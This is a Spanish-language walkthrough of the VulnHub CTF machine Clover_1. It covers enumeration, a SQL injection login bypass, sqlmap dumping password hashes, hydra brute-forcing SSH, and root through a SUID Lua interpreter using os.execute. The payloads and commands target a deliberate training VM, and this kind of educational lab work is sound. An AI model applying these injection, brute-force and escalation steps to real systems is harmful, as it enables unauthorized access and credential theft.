---
icon: flag
---

# Clover\_1 VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-15 11:27 EDT
Nmap scan report for 192.168.5.190
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Mar 26  2021 maintenance
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 bc:a7:bf:7f:23:83:55:08:f7:d1:9a:92:46:c6:ad:2d (DSA)
|   2048 96:bd:c2:57:1c:91:7b:0a:b9:49:5e:7f:d1:37:a6:65 (RSA)
|   256 b9:d9:9d:58:b8:5c:61:f2:36:d9:b2:14:e8:00:3c:05 (ECDSA)
|_  256 24:29:65:28:6e:fa:07:6a:f1:6b:fa:07:a0:13:1b:b6 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 3 disallowed entries 
|_/admin /root /webmaster
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
MAC Address: 00:0C:29:0C:40:0D (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds
```

### ftp

```shell
ftp anonymous@<IP>
```

Nos encontraremos el siguiente directorio que contiene lo siguiente...

```
drwxr-xr-x    2 ftp      ftp          4096 Mar 26  2021 maintenance
```

```
-rw-r--r--    1 ftp      ftp            13 Mar 26  2021 locale.txt
-rw-r--r--    1 ftp      ftp             3 Mar 26  2021 test.txt
-rw-r--r--    1 ftp      ftp            54 Mar 26  2021 test2.txt
```

Nos descargamos todos...

```shell
get locale.txt

get test.txt

get test2.txt
```

Y cada uno de ellos contendra lo siguiente...

> locale.txt

```
cGluZyBwb25n
```

> test.txt

```
OK
```

> test2.txt

```
We are under test. 
Plese delete FTP anonymous login.
```

No hay mucha informacion...

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt,md -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.190/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,md
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.md         (Status: 403) [Size: 278]
/.htpasswd.md         (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 3]
/javascript           (Status: 403) [Size: 278]
/phpmyadmin           (Status: 200) [Size: 9167]
/robots.txt           (Status: 200) [Size: 105]
/robots.txt           (Status: 200) [Size: 105]
/server-status        (Status: 403) [Size: 278]
/status               (Status: 200) [Size: 10]
/website              (Status: 200) [Size: 10013]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesantes...

Si nos vamos al `/robots.txt`...

```
User-agent: *
Allow: /status
Allow: /status-admin

Disallow: /admin
Disallow: /root
Disallow: /webmaster
```

Vemos varias rutas, pero ninguna valida, por lo que nos vamos a `/website` y encontraremos una pagina web, le tiraremos un `gobuster`...

```shell
gobuster dir -u http://<IP>/website/ -w <WORDLIST> -x html,php,txt,md -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.190/website/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.md         (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.md         (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/LICENSE              (Status: 200) [Size: 1062]
/README.md            (Status: 200) [Size: 31490]
/images               (Status: 200) [Size: 2414]
/index.html           (Status: 200) [Size: 10013]
/robots.txt           (Status: 200) [Size: 59]
/robots.txt           (Status: 200) [Size: 59]
/scripts              (Status: 200) [Size: 967]
/styles               (Status: 200) [Size: 962]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

No hay gran cosa, pero si se inspecciona la pagina de `/website` vemos que esta con la estructura del `CMS ColdFuison` por lo que si buscamos por `Google` donde se encuentra por defecto el `Administrator` del `CMS de ColdFusion` veremos lo siguiente...

```html
<!-- We are under Construction -- CMS ColdFusion -->
```

> Google

```
The default location of the ColdFusion Administrator login page is http**://servername:8500/CFIDE/administrator/index.cfm**, where servername is the fully qualified domain name of your web server. Common values for servername are localhost or 127.0. 0.1 (each refers to the web server on the local computer).
```

Por lo que parece deberia de estar en una carpeta llamada `CFIDE` y si lo buscamos en la `URL` es cierto no aparecera una carpeta llamada `Administrator` y si entramos dentro una pagina web...

```
URL = http://<IP>/CFIDE/Administrator/
```

```shell
gobuster dir -u http://<IP>/CFIDE/Administrator/ -w <WORDLIST> -x html,php,txt,md -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.190/CFIDE/Administrator/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htaccess.md         (Status: 403) [Size: 278]
/.htpasswd.md         (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/assets               (Status: 200) [Size: 1178]
/css                  (Status: 200) [Size: 1406]
/index.html           (Status: 200) [Size: 31079]
/js                   (Status: 200) [Size: 1823]
/logout.php           (Status: 200) [Size: 29]
/login.php            (Status: 200) [Size: 533]
/manual               (Status: 200) [Size: 1003]
/session.php          (Status: 200) [Size: 533]
/welcome.php          (Status: 200) [Size: 533]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

Si nos vamos a `/login.php` veremos un panel de login y si introducimos...

```
User = ' OR 1=1-- -
Password = test
```

Nos logeara pero no veremos nada por lo que ya deducimos que es vulnerable a `SQL Injecction` haremos lo siguiente...

Estando dentro de ese panel, pondremos lo que sea en el usuario y contraseña pero antes de darle a enviar lo capturaremos con `Burp Suit` para copiar el `request` y pegarlo en un archivo de texto para ejecutar la herramienta `sqlamp`...

> request.txt

```
POST /CFIDE/Administrator/login.php HTTP/1.1
Host: 192.168.5.190
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://192.168.5.190
Connection: close
Referer: http://192.168.5.190/CFIDE/Administrator/login.php
Cookie: PHPSESSID=mqafhkmk7tbhlod7isfgspmcd0
Upgrade-Insecure-Requests: 1

uname=admin&pswd=admin
```

Una vez tengamos nuestro archivo ejecutamos lo sigueinte...

```shell
sqlmap -r request.txt --dbs
```

Info:

```
       ___
       __H__                                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.8.2#stable}                                                                                                                     
|_ -| . [,]     | .'| . |                                                                                                                                    
|___|_  [(]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:54:16 /2024-06-15/

[11:54:16] [INFO] parsing HTTP request from 'request.txt'
[11:54:16] [INFO] testing connection to the target URL
[11:54:16] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:54:16] [INFO] testing if the target URL content is stable
[11:54:16] [INFO] target URL content is stable
[11:54:16] [INFO] testing if POST parameter 'uname' is dynamic
[11:54:16] [WARNING] POST parameter 'uname' does not appear to be dynamic
[11:54:16] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[11:54:16] [INFO] testing for SQL injection on POST parameter 'uname'
[11:54:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:54:16] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:54:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[11:54:16] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[11:54:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[11:54:17] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[11:54:17] [INFO] testing 'Generic inline queries'
[11:54:17] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[11:54:17] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[11:54:17] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[11:54:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:54:27] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[11:54:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:54:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:54:31] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[11:54:32] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[11:54:32] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 96 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 8115 FROM (SELECT(SLEEP(5)))lZkL) AND 'dIfZ'='dIfZ&pswd=admin
---
[11:54:50] [INFO] the back-end DBMS is MySQL
[11:54:50] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[11:54:50] [INFO] fetching database names
[11:54:50] [INFO] fetching number of databases
[11:54:50] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
5
[11:55:05] [INFO] retrieved: 
[11:55:10] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[11:56:07] [INFO] retrieved: clover
[11:56:28] [INFO] retrieved: mysql
[11:56:44] [INFO] retrieved: performance_schema
[11:57:39] [INFO] retrieved: sys
available databases [5]:
[*] clover
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[11:57:49] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.190'

[*] ending @ 11:57:49 /2024-06-15/
```

Nos descubrira una base de datos llamada `clover`...

```shell
sqlmap -r request.txt --dbms=mysql --level=3 --risk=3 -D clover --dump
```

Info:

```
sqlmap -r request.txt --dbms=mysql --level=3 --risk=3 -D clover --dump   
        ___
       __H__                                                                                                                                                 
 ___ ___[.]_____ ___ ___  {1.8.2#stable}                                                                                                                     
|_ -| . [)]     | .'| . |                                                                                                                                    
|___|_  [(]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:01:20 /2024-06-15/

[12:01:20] [INFO] parsing HTTP request from 'request.txt'
[12:01:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 8115 FROM (SELECT(SLEEP(5)))lZkL) AND 'dIfZ'='dIfZ&pswd=admin
---
[12:01:20] [INFO] testing MySQL
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[12:01:27] [INFO] confirming MySQL
[12:01:27] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[12:01:37] [INFO] adjusting time delay to 1 second due to good response times
[12:01:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.0
[12:01:37] [INFO] fetching tables for database: 'clover'
[12:01:37] [INFO] fetching number of tables for database 'clover'
[12:01:37] [INFO] retrieved: 1
[12:01:38] [INFO] retrieved: users
[12:01:54] [INFO] fetching columns for table 'users' in database 'clover'
[12:01:54] [INFO] retrieved: 3
[12:01:57] [INFO] retrieved: id
[12:02:03] [INFO] retrieved: username
[12:02:25] [INFO] retrieved: password
[12:02:52] [INFO] fetching entries for table 'users' in database 'clover'
[12:02:52] [INFO] fetching number of entries for table 'users' in database 'clover'
[12:02:52] [INFO] retrieved: 3
[12:02:55] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                     
1
[12:02:58] [INFO] retrieved: 33a41c7507cy5031d9tref6fdb31880c
[12:04:38] [INFO] retrieved: 0xBush1do
[12:05:13] [INFO] retrieved: 2
[12:05:16] [INFO] retrieved: 69a41c7507ad7031d9decf6fdb31810c
[12:06:56] [INFO] retrieved: asta
[12:07:06] [INFO] retrieved: 3
[12:07:09] [INFO] retrieved: 92ift37507ad7031d9decf98setf4w0c
[12:08:55] [INFO] retrieved: 0xJin
[12:09:16] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[12:13:53] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 

[12:13:59] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[12:14:02] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[12:14:02] [INFO] starting 8 processes 
[12:14:07] [WARNING] no clear password(s) found                                                                                                             
Database: clover
Table: users
[3 entries]
+----+----------------------------------+-----------+
| id | password                         | username  |
+----+----------------------------------+-----------+
| 1  | 33a41c7507cy5031d9tref6fdb31880c | 0xBush1do |
| 2  | 69a41c7507ad7031d9decf6fdb31810c | asta      |
| 3  | 92ift37507ad7031d9decf98setf4w0c | 0xJin     |
+----+----------------------------------+-----------+

[12:14:07] [INFO] table 'clover.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.5.190/dump/clover/users.csv'
[12:14:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.190'

[*] ending @ 12:14:07 /2024-06-15/
```

Por lo que vemos nos saco varias credenciales, pero la que nos interesa es la del usuario `asta`...

Si crackeamos esa contraseña quedaria algo tal que asi...

```
69a41c7507ad7031d9decf6fdb31810c = asta$$123
```

Por lo que nos conectamos por `ssh`...

```shell
ssh asta@<IP>
```

Y una vez dentro metiendo esa contarseña leemos la flag...

> local.txt (flag1)

```



                                |     |
                                \\_V_//
                                \/=|=\/
       Asta PWN!                 [=v=]
                               __\___/_____
                              /..[  _____  ]
                             /_  [ [  M /] ]
                            /../.[ [ M /@] ]
                           <-->[_[ [M /@/] ]
                          /../ [.[ [ /@/ ] ]
     _________________]\ /__/  [_[ [/@/ C] ]
    <_________________>>0---]  [=\ \@/ C / /
       ___      ___   ]/000o   /__\ \ C / /
          \    /              /....\ \_/ /
       ....\||/....           [___/=\___/
      .    .  .    .          [...] [...]
     .      ..      .         [___/ \___]
     .    0 .. 0    .         <---> <--->
  /\/\.    .  .    ./\/\      [..]   [..]
 / / / .../|  |\... \ \ \    _[__]   [__]_
/ / /       \/       \ \ \  [____>   <____]



34f35ca9ea7febe859be7715b707d684
```

Si nos vamos a la siguiente ruta...

```shell
cd /var/backups/reminder
```

Vemos un archivo llamado `passwd.sword` y contiene lo siguiente...

```
Oh well, this is a reminder for Sword's password. I just remember this:

passwd sword: P4SsW0rD**** 

I forgot the last four numerical digits!
```

Por lo que haremos lo siguiente...

```shell
mp64 P4SsW0rD?d?d?d?d > dic.txt
```

Para crear un diccionario con todas las posibles combinaciones numericas, una vez hecho esto tiraremos un `hydra`...

```shell
hydra -l sword -P dic.txt ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-15 12:50:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~157 tries per task
[DATA] attacking ssh://192.168.5.190:22/
[STATUS] 459.00 tries/min, 459 tries in 00:01h, 9568 to do in 00:21h, 37 active
[STATUS] 270.33 tries/min, 811 tries in 00:03h, 9230 to do in 00:35h, 23 active
[STATUS] 200.57 tries/min, 1404 tries in 00:07h, 8637 to do in 00:44h, 23 active
[STATUS] 181.47 tries/min, 2722 tries in 00:15h, 7322 to do in 00:41h, 20 active
[22][ssh] host: 192.168.5.190   login: sword   password: P4SsW0rD4286
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 17 final worker threads did not complete until end.
[ERROR] 17 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-15 13:16:46
```

Si hacemos...

```shell
su sword
```

Y metemos esa contraseña seremos ese usuario y llendo a su `home` leeremos la otra flag...

> local2.txt

```

     /\
    // \
    || |
    || |
    || |      Sword PWN!
    || |
    || |
    || |
 __ || | __
/___||_|___\
     ww
     MM
    _MM_
   (&<>&)
    ~~~~




e63a186943f8c1258cd1afde7722fbb4
```

Si hacemos lo siguiente...

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Veremos esto...

```
146396   92 -rwsr-xr-x   1 root     root        90456 Oct 19  2019 /sbin/mount.nfs
263962   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
284096  144 -rwsr-xr-x   1 root     root       146160 Mar 22  2019 /bin/ntfs-3g
262818   40 -rwsr-xr-x   1 root     root        40168 May 17  2017 /bin/su
285568   36 -rwsr-xr-x   1 root     root        34896 Aug 15  2018 /bin/fusermount
263961   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
 36133  328 -rwsr-xr--   1 root     dip        333560 Feb  9  2020 /usr/sbin/pppd
 16139 1012 -rwsr-xr-x   1 root     root      1035392 May 16  2020 /usr/sbin/exim4
   106   44 -rwsr-xr-x   1 root     root        44464 May 17  2017 /usr/bin/chsh
   105   56 -rwsr-xr-x   1 root     root        53616 May 17  2017 /usr/bin/chfn
 16457   88 -rwsr-sr-x   1 root     mail        89248 Nov 18  2017 /usr/bin/procmail
 42187  156 -rwsr-xr-x   1 root     root       157760 Feb  1  2020 /usr/bin/sudo
 16065   56 -rwsr-sr-x   1 daemon   daemon      55424 Sep 30  2014 /usr/bin/at
   109   56 -rwsr-xr-x   1 root     root        54192 May 17  2017 /usr/bin/passwd
 37854   12 -rwsr-sr-x   1 root     root        10104 Apr  1  2014 /usr/bin/X
  3939   40 -rwsr-xr-x   1 root     root        39912 May 17  2017 /usr/bin/newgrp
 18554   24 -rwsr-xr-x   1 root     root        23184 Jan 28  2019 /usr/bin/pkexec
   108   76 -rwsr-xr-x   1 root     root        75376 May 17  2017 /usr/bin/gpasswd
 42714  196 -rwsrwsrwx   1 root     sword      199512 Mar 24  2021 /usr/games/clover/deamon.sh
  7976   12 -rwsr-xr-x   1 root     root        10104 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
 18561   16 -rwsr-xr-x   1 root     root        14672 Jan 28  2019 /usr/lib/policykit-1/polkit-agent-helper-1
145769   16 -rwsr-xr-x   1 root     root        14200 Aug 31  2018 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
146401  456 -rwsr-xr-x   1 root     root       464904 Mar 25  2019 /usr/lib/openssh/ssh-keysign
142237  292 -rwsr-xr--   1 root     messagebus   298608 Jun  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Veremos que tenemos un permiso `SUID` en un archivo poco comun y que se puede explotar para ser `root`...

```
RUTA = /usr/games/clover/
```

```
-rwsrwsrwx 1 root  sword 199512 Mar 24  2021 deamon.sh
```

Si ejecutamos eso vemos que es un lenguaje de progrmacion con `Lua` por lo que haremos lo siguiente...

```shell
./deamon.sh

> os.execute("/bin/bash -p")
bash-4.3# whoami
root
```

Con esto ya seriamos `root` por lo que leeremos la flag...

> proof.txt (flag3)

```

             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |  # whoami                               |    |
           |   |  # root                                 |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |     Congratulations You PWN Clover!     |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |    974bd350558b912740f800a316c53afe     |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/
                ___________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-------------------------. .-.---. .---.-.-.-.`-_
:-------------------------------------------------------------------------:
`---._.-------------------------------------------------------------._.---'



// From 0xJin && 0xBush1do! If you root this, tag me on Twitter! @0xJin and @0xBush1do
```
